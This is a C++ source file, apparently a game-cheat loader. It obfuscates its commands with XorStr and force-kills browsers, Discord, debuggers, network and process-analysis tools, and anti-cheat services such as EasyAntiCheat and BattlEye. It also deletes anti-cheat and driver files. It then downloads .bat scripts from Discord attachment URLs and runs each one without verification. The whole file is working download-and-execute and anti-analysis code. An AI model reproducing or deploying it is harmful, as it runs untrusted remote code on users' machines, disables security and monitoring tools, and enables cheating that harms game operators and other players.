#include <iostream>
#include "../../secret chat/Headers/xorstr.hpp"
#include <string>
#include <windows.h>
#include <filesystem>
#include <Urlmon.h>
#pragma comment(lib, "urlmon.lib")

void apex()
{

    std::string apex = "https://cdn.discordapp.com/attachments/784033421747814400/877941040638738512/apex.bat";
    std::string apexpath = "C:\Apex.bat";
    URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
    system("Start C:\Apex.bat");

}
void gta() 
{

    std::string gta = "https://cdn.discordapp.com/attachments/784033421747814400/877942560830685194/gta.bat";
    std::string gtapath = "C:\gta.bat";
    URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
    system("Start C:\gta.bat");

}

void fishingplanet()
{

    std::string fishingplanet = "https://cdn.discordapp.com/attachments/869679952444940298/877944079139373066/fishing-planet.bat";
    std::string fishingplanetpath = "C:\Fishing-planet.bat";
    URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
    system("Start C:\Fishing-planet.bat");

}
void cleaner(){
    system(XorStr("cls").c_str());
    system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM clRender.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM chrome.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM msedge.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM discord.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM firefox.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM brave.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM opera.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmnat.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM Spotify.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM MSBuild.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\System32\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("sc stop capcom").c_str());
    system(XorStr("sc delete capcom").c_str());
    system(XorStr("taskkill /F /IM cef_subprocces.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM devenv.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM LockApp.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im procmon.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im helper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im die.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im BEService.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
    system(XorStr("sc stop BEService >nul 2>&1").c_str());
    system(XorStr("sc stop BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());

}

int main()
{
    cleaner();
    fishingplanet();
    gta();
    apex();
    
}

